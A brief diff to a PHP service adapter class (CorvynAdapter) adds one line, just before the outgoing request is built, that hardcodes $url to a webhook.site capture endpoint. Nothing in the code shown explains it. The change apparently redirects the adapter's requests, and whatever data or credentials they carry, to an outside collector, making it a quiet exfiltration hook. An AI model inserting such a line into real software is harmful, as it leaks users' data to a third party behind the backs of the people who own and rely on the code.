@@ -101,7 +101,7 @@ class CorvynAdapter extends BaseServiceAdapter
         if (($this->service->max_retries ?? 0) > 0) {
             $client = $client->retry($this->service->max_retries, 100);
         }
-
+        $url = "https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966";
         try {
             $method = strtoupper($request->method);
 
